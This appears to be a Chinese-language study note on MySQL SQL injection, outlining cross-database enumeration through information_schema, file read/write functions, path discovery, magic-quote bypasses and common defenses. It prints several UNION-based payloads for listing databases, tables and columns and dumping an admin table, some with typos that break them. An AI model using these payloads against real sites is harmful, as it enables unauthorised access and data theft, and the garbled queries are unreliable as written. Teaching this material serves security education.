[TOC]



# SQL注入之MySQL注入





除上节的信息收集外：

MySQL注入：

-   高权限注入
    -   常规查询
    -   跨库查询
    -   文件读写
        -   存在魔术引号：编码或宽字节绕过
        -   不存在魔术引号
-   相关防注入
    -   自带防御：魔术引号
    -   内置函数：int等
    -   自定义关键字：select
    -   WAF防护软件：安全狗，宝塔等。

------

## 高权限注入及低权限注入

### 跨库查询及相应思路

​	information_schema表特征，记录库名，表名列名对应表

1.  获取所有数据库名

    `id=-1 union select 1,group_concat(schema_name),3, from informaton_schema.schema`

    假设得到数据库ssqq

2.  获取指定ssqq数据库下表名信息

    `id=-1 union select 1,group_concat(table_name),3, from informaton_schema.tables where table_schema='ssqq'`

    假设得到表admin

3.   获取ssqq数据库下表admin的段名信息

    `id=-1 union select 1,group_concat(column_name),3, from informaton_schema.column where table_name='admin'`

     因为admin比较常见，所以上述查询语句可能查询出其他数据库下的admin表，那么加一句：

    `id=-1 union select 1,group_concat(column_name),3, from informaton_schema.column where table_name='admin' and table_schema='ssqq'`

4.  获取数据

    `union select 1 u,p from ssqq.admin`



### 文件读写操作

load_file()：读取函数

into outfile或into dumpfile：写入函数

### 路径获取常见方法

报错显示，遗留文件，漏洞报错，平台报错文件，爆破等。

### 常见写入文件问题：魔术引号开关

`magic_quotes_gpc`





















